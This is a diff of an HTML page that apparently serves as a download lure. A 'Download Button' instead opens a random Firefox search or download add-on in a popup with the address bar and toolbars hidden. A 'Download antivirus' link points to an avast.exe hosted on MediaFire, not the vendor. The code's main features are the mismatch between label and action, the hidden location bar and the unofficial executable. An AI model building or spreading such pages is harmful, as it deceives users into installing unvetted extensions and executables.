@@ -112,20 +112,6 @@
 <body>
 
 
-    <button onclick="openRandomLink()">
-    <img src="https://archive.org/download/download-button-png//download-button-png.png" alt="Download Button">
-</button>
-
-<script>
-    function openRandomLink() {
-        var firefoxLinks = [
-            "https://addons.mozilla.org/en-US/firefox/addon/premium-search-bar/",
-            "https://addons.mozilla.org/en-US/firefox/addon/download-monitor/"
-        ];
-        var randomIndex = Math.floor(Math.random() * firefoxLinks.length);
-        window.open(firefoxLinks[randomIndex], "_blank", "width=500,height=500");
-    }
-</script>
 
 
 <div class="menu">
@@ -142,7 +128,30 @@
 <!-- Gray Button -->
 <a href="https://download1649.mediafire.com/7w3zo93jpwegs7iRFW5mfLYHYd5q8brIn1uObe6WwoKNo-G81Q8ZYnuxNBmsIGaEkp01WkK7ZlVtt2EbXkgreCpu0gUPA0EqxUoC4P0oljoSS-iihk4kpHg1GJkXGZFgrZRvcGX9PP7gFkSoFaHkOgWyVlOdGWMzpFMw2PoYJw/bki6160y9yesh9c/avast.exe" class="gray-button">
     <span>Download antivirus</span>
+
+    
 </a>
+
+
+
+     <button onclick="openRandomLink()">
+    <img src="https://archive.org/download/download-button-png//download-button-png.png" alt="Download Button">
+</button>
+
+<script>
+    function openRandomLink() {
+        var firefoxLinks = [
+            "https://addons.mozilla.org/en-US/firefox/addon/premium-search-bar/",
+            "https://addons.mozilla.org/en-US/firefox/addon/download-monitor/"
+        ];
+        var randomIndex = Math.floor(Math.random() * firefoxLinks.length);
+        
+        // Customized window features
+        var features = "width=400,height=600,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,copyhistory=no,resizable=yes";
+
+        window.open(firefoxLinks[randomIndex], "_blank", features);
+    }
+</script>
 
 </body>
 </html>
